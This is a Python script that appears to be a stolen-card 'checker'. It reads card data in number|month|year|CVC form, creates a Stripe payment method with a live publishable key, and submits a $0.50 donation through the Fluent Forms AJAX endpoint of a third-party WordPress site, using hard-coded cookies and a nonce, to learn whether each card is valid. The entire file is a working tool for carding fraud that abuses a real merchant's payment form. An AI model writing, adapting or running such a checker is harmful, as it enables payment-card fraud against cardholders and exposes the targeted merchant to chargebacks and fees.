import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F56a6ae254e%3B+stripe-js-v3%2F56a6ae254e%3B+card-element&key=pk_live_51QT3bQFGtPXl9NSAAe8reAydeDRbepxse3034eUXrBPGE4E6Y1cjwQrFLUgza2Q0tjYmmEpDdSaiXYG2F83hkEL700KgPEqVNb'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_lscache_vary': 'a9eed09526a27a2bd2b0c8c6c080c93a',
	    '__stripe_mid': 'cc793db4-35fd-403f-a86a-b4f0793c9a2c73f959',
	    '__stripe_sid': 'ab327d7c-b30c-4801-81af-cacde7d8d5eaf8fd75',
	}
	
	headers = {
	    'authority': 'nberdine.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_lscache_vary=a9eed09526a27a2bd2b0c8c6c080c93a; __stripe_mid=cc793db4-35fd-403f-a86a-b4f0793c9a2c73f959; __stripe_sid=ab327d7c-b30c-4801-81af-cacde7d8d5eaf8fd75',
	    'origin': 'https://nberdine.com',
	    'referer': 'https://nberdine.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1741686483496',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=9&_fluentform_4_fluentformnonce=4d52d6f593&_wp_http_referer=%2F&dropdown_1=One-time&numeric-field=1.00&custom-payment-amount_1=0.50&numeric-field_1=0.33&input_radio=no&payment_method=stripe&checkbox_1%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '4',
	}
	
	r2 = requests.post('https://nberdine.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
